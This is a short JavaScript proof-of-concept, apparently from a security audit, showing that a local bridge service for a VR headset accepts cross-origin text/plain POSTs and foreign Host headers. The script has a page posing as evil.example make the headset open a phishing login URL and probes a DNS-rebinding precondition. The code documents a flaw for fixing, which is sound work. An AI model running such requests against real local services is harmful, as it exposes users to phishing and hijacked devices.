// R4: a web page can POST /command as a CORS "simple request" (text/plain, no preflight).
import { bridge, ws, sleep } from "./lib.mjs";
const port = 48714; const b = await bridge(port);
const real = await ws(port, { device: "Real Quest" });
const res = await fetch(`http://127.0.0.1:${port}/command`, { method: "POST", headers: { "content-type": "text/plain", Origin: "https://evil.example" },
  body: JSON.stringify({ op: "show", role: "primary", wait: false, timeoutMs: 0, panel: { kind: "preview", url: "https://phish.example/login", size: "large" } }) });
console.log("POST /command from evil Origin, text/plain ->", res.status, await res.text());
await sleep(100);
console.log("headset received:", real.msgs.filter(m=>m.type==="show").map(m=>m.panel.url));
const st = await fetch(`http://127.0.0.1:${port}/status`, { headers: { Host: "attacker.example:"+port } });
console.log("GET /status with foreign Host header (DNS-rebinding precondition) ->", st.status);
process.exit(0);
